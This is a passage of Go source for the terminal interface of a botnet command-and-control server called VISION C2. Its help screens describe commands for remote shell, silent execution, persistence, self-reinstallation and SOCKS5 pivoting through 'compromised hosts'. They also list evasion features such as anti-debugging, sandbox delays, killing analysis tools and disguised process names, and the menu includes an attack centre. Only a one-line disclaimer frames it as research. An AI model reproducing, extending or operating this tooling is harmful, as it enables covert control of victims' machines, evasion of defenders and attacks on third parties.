			{"Uptime", "Time since bot connected"},
		}
		for _, c := range columns {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-10s", c.col)),
				dim.Render(c.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Bot Commands") + "\n")
		cmds := []struct{ cmd, desc string }{
			{"!persist", "Install cron/startup persistence"},
			{"!reinstall", "Force re-download and reinstall"},
			{"!lolnogtfo", "Kill and remove bot permanently"},
			{"!shell <cmd>", "Execute command, return output"},
			{"!exec <cmd>", "Execute command silently"},
			{"!detach <cmd>", "Execute in background"},
			{"!info", "Request bot system information"},
			{"!socks <port>", "Start SOCKS5 proxy on port"},
			{"!stopsocks", "Stop SOCKS5 proxy"},
		}
		for _, c := range cmds {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-15s", c.cmd)),
				dim.Render(c.desc)))
		}

	case 4: // Shell Controls
		b.WriteString(neonCyan.Bold(true).Render("  💻 SHELL CONTROLS"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Remote Shell (Single Bot)") + "\n")
		b.WriteString(dim.Render("  Interactive session with one bot. Select from Bot List.") + "\n\n")
		shellKeys := []struct{ key, desc string }{
			{"enter", "Execute typed command"},
			{"↑ / ↓", "Navigate command history"},
			{"pgup/pgdn", "Scroll output up/down"},
			{"ctrl+p", "Send !persist command"},
			{"ctrl+r", "Send !reinstall command"},
			{"ctrl+x", "Kill bot (requires y/n confirm)"},
			{"ctrl+f", "Clear shell output"},
			{"esc", "Return to main menu"},
		}
		for _, k := range shellKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Broadcast Shell (All Bots)") + "\n")
		b.WriteString(dim.Render("  Send commands to multiple bots simultaneously.") + "\n\n")
		broadcastKeys := []struct{ key, desc string }{
			{"enter", "Broadcast command to filtered bots"},
			{"ctrl+p", "Broadcast !persist (with confirm)"},
			{"ctrl+r", "Broadcast !reinstall (with confirm)"},
			{"ctrl+a", "Cycle arch filter (all/x86_64/aarch64/arm/mips)"},
			{"ctrl+g", "Cycle min RAM filter (0/512/1G/2G/4G MB)"},
			{"ctrl+n", "Cycle max bots limit (0/10/50/100/500)"},
			{"esc", "Return to main menu"},
		}
		for _, k := range broadcastKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Command Prefixes") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("(none)     "), dim.Render("Sent as !shell <cmd> — waits for output")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!          "), dim.Render("Sent directly (e.g. !info, !detach ls)")))

	case 5: // SOCKS Proxy
		b.WriteString(neonPurple.Bold(true).Render("  🧦 SOCKS5 PROXY MANAGER"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Overview") + "\n")
		b.WriteString(white.Render("  Start SOCKS5 reverse proxies on any connected bot.") + "\n")
		b.WriteString(white.Render("  Route traffic through compromised hosts for pivoting.") + "\n\n")

		b.WriteString(neonOrange.Render("  Controls") + "\n")
		socksKeys := []struct{ key, desc string }{
			{"↑ / ↓", "Select a bot from the list"},
			{"s", "Start SOCKS5 on selected bot (enter port)"},
			{"x", "Stop SOCKS5 on selected bot"},
			{"← / →", "Switch view: All / Active / Stopped"},
			{"enter", "Confirm port and start proxy"},
			{"esc", "Cancel port input"},
			{"r", "Refresh bot and proxy status"},
			{"q", "Back to main menu"},
		}
		for _, k := range socksKeys {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
				white.Render(k.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  View Modes") + "\n")
		viewModes := []struct{ mode, desc string }{
			{"All Bots", "Every connected bot (start proxy on any)"},
			{"Active", "Only bots with running SOCKS5 proxies"},
			{"Stopped", "Bots with previously stopped proxies"},
		}
		for _, v := range viewModes {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", v.mode)),
				dim.Render(v.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Usage After Starting") + "\n")
		b.WriteString(white.Render("  curl --socks5 BOT_IP:PORT http://target.com") + "\n")
		b.WriteString(white.Render("  proxychains4 nmap -sT target.com") + "\n")
		b.WriteString(dim.Render("  Default port: 1080. Binds on 0.0.0.0.") + "\n")

	case 6: // Network & Security
		b.WriteString(neonOrange.Bold(true).Render("  🔒 NETWORK & SECURITY"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Communication") + "\n")
		netInfo := []struct{ item, desc string }{
			{"Protocol", "TLS 1.3 encrypted channel (port 443)"},
			{"Auth", "HMAC/MD5 challenge-response handshake"},
			{"C2 Resolve", "DoH TXT → DNS TXT → A record → direct IP"},
			{"Encryption", "RC4 + XOR + MD5 + Base64 layered"},
			{"Keepalive", "2-second tick with auto-reconnect"},
		}
		for _, n := range netInfo {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", n.item)),
				white.Render(n.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Bot Evasion") + "\n")
		evasion := []struct{ item, desc string }{
			{"Daemonize", "Fork to background, adopted by PID 1"},
			{"Single Inst", "PID lock file prevents duplicates"},
			{"Anti-Debug", "Detects 30+ analysis tools & debuggers"},
			{"Sandbox", "Random 24-27h delay if sandboxed"},
			{"Proc Scan", "Kills known analysis processes"},
			{"Stealth", "Disguised process name on startup"},
		}
		for _, e := range evasion {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", e.item)),
				white.Render(e.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Persistence") + "\n")
		persist := []struct{ item, desc string }{
			{"Cron", "Auto-restart via cron job on reboot"},
			{"Startup", "Systemd/init.d startup scripts"},
			{"Reinfect", "Self-reinstall on binary removal"},
		}
		for _, p := range persist {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-12s", p.item)),
				white.Render(p.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Supported Architectures") + "\n")
		b.WriteString(white.Render("  amd64, 386, arm, arm64, mips, mipsle, mips64,") + "\n")
		b.WriteString(white.Render("  mips64le, ppc64, ppc64le, riscv64, s390x, loong64") + "\n")

	case 7: // Troubleshooting
		b.WriteString(neonYellow.Bold(true).Render("  🔧 TROUBLESHOOTING"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Bots Not Connecting") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Check firewall: ufw allow 443/tcp")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Verify C2 address in setup_config.txt")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Test TLS: openssl s_client -connect IP:443")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Ensure protocol version matches (bot & server)")))

		b.WriteString("\n" + neonOrange.Render("  Port 443 Permission Denied") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Run as root: sudo ./server")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Or: sudo setcap 'cap_net_bind_service=+ep' ./server")))

		b.WriteString("\n" + neonOrange.Render("  TUI Display Issues") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Minimum terminal size: 80x24")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Use a terminal with 256-color support")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Try resizing or using screen/tmux")))

		b.WriteString("\n" + neonOrange.Render("  Build Errors") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Go not found: export PATH=$PATH:/usr/local/go/bin")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("UPX missing: sudo apt install upx-ucl")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("ARM/RISC-V error: update to latest VisionC2")))

		b.WriteString("\n" + neonOrange.Render("  Dead Bots") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Bots auto-cleaned after 5 min timeout")))
		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Press r in Bot List to force refresh")))

	case 8: // About
		b.WriteString(neonPink.Bold(true).Render("  👁️  ABOUT VISION C2"))
		b.WriteString("\n\n")

		b.WriteString(neonOrange.Render("  Project") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Name:"), neonCyan.Bold(true).Render("☾℣☽ VISION C2")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Version:"), white.Render("V2.3")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Protocol:"), white.Render("V1_2")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Language:"), white.Render("Go 1.23+")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("License:"), white.Render("GNU GPL")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("TUI:"), white.Render("BubbleTea + Lipgloss")))

		b.WriteString("\n" + neonOrange.Render("  Credits") + "\n")
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Developer:"), neonPink.Render("Syn")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Email:"), white.Render("dev@sinners.city")))
		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("X/Twitter:"), white.Render("@synacket")))

		b.WriteString("\n" + neonOrange.Render("  Documentation") + "\n")
		docs := []struct{ file, desc string }{
			{"ARCHITECTURE.md", "Full system architecture deep-dive"},
			{"CHANGELOG.md", "Version history and release notes"},
			{"COMMANDS.md", "Complete TUI hotkey reference"},
			{"USAGE.md", "Setup, config, and usage guide"},
		}
		for _, d := range docs {
			b.WriteString(fmt.Sprintf("  %s %s\n",
				neonCyan.Render(fmt.Sprintf("%-18s", d.file)),
				dim.Render(d.desc)))
		}

		b.WriteString("\n" + neonOrange.Render("  Legal") + "\n")
		b.WriteString(dim.Render("  For authorized security research and educational") + "\n")
		b.WriteString(dim.Render("  purposes only. Unauthorized use is illegal.") + "\n")
	}

	b.WriteString("\n")
	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
	b.WriteString("\n")
	b.WriteString(fmt.Sprintf("  %s Prev  %s Next  %s Back\n",
		neonYellow.Render("[←/h]"),
		neonYellow.Render("[→/l]"),
		neonYellow.Render("[q]")))

	return b.String()
}

func (m TUIModel) renderStatusBar() string {
	// Check if toast has expired
	toast := ""
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		toast = m.toastMessage
	}

	width := m.width
	if width == 0 {
		width = 120
	}

	// Style definitions for status bar elements
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Bold(true)
	neonPink := lipgloss.NewStyle().Foreground(lipgloss.Color("201")).Bold(true)
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
	dimStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
	whiteStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("252"))

	// Get C2 uptime
	uptime := getC2Uptime()

	// Get architecture distribution
	archMap := getArchMap()
	archParts := []string{}
	for arch, count := range archMap {
		archParts = append(archParts, fmt.Sprintf("%s:%d", arch, count))
	}
	archStr := "none"
	if len(archParts) > 0 {
		archStr = strings.Join(archParts, " ")
	}

	// View names mapping
	viewNames := []string{"Dashboard", "Bots", "Attack", "Methods", "Settings", "Help", "Shell", "Broadcast"}
	viewIdx := int(m.currentView)
	if viewIdx >= len(viewNames) {
		viewIdx = 0
	}

	// Build single status bar with all info
	leftSection := fmt.Sprintf(" %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
		neonPink.Render("☾℣☽"),
		neonCyan.Render("VISION"),
		dimStyle.Render("│"),
		neonGreen.Render("●"),
		whiteStyle.Render("ONLINE"),
		dimStyle.Render("│"),
		neonYellow.Render("⚡"),
		whiteStyle.Render(fmt.Sprintf("%d", m.botCount)),
		dimStyle.Render("│"),
		whiteStyle.Render(formatRAM(m.totalRAM)),
		dimStyle.Render("│"),
		neonCyan.Render("⏱"),
		whiteStyle.Render(uptime),
		dimStyle.Render("│"))

	archSection := fmt.Sprintf("%s", neonCyan.Render(archStr))

	rightSection := fmt.Sprintf("%s %s ",
		dimStyle.Render("│"),
		neonPink.Render(viewNames[viewIdx]))

	// Calculate raw lengths for padding (strip ANSI codes)
	rawLeft := fmt.Sprintf(" ☾℣☽ VISION │ ● ONLINE │ ⚡ %d │ %s │ ⏱ %s │ %s",
		m.botCount, formatRAM(m.totalRAM), uptime, archStr)
	rawRight := fmt.Sprintf("│ %s ", viewNames[viewIdx])

	padding := width - len(rawLeft) - len(rawRight)
	if padding < 0 {
		padding = 0
	}

	bar := leftSection + archSection + strings.Repeat(" ", padding) + rightSection

	// Render single status bar
	statusBar := lipgloss.NewStyle().
		Background(lipgloss.Color("236")).
		Width(width).
		Render(bar)

	// Add toast below status bar if active
	if toast != "" {
		toastBar := lipgloss.NewStyle().
			Background(lipgloss.Color("234")).
			Width(width).
			Padding(0, 1).
			Render(toast)
		return statusBar + "\n" + toastBar
	}

	return statusBar
}

// NewTUIModel creates a new TUI model with default values
func NewTUIModel() TUIModel {
	return TUIModel{
		currentView: ViewDashboard,
		menuItems: []string{
			"BOT MANAGEMENT",
			"ATTACK CENTER",
			"BROADCAST SHELL",
			"SOCKS MANAGER",
			"HELP & INFO",
			"EXIT",
		},
		menuCursor:     0,
		status:         "ONLINE",
		attackMethod:   "",
		attackCmd:      "",
		attackDuration: "60",
		attackPort:     "80",
		methodCursor:   0,
		shellOutput:    []string{},
		shellHistory:   []string{},
	}
}

// Global TUI program for external updates
var tuiProgram *tea.Program

// StartTUI starts the Bubble Tea TUI (for local console mode)
func StartTUI() error {
	m := NewTUIModel()
	m.botCount = getBotCount()
	m.totalRAM = getTotalRAM()
	m.totalCPU = getTotalCPU()

	p := tea.NewProgram(m, tea.WithAltScreen())
	tuiProgram = p
	_, err := p.Run()
	return err
}

// LogBotConnection adds a connection event to the TUI log
func LogBotConnection(arch string, connected bool) {
	if tuiProgram != nil {
		tuiProgram.Send(ConnLogMsg{Arch: arch, Connected: connected})
	}
}
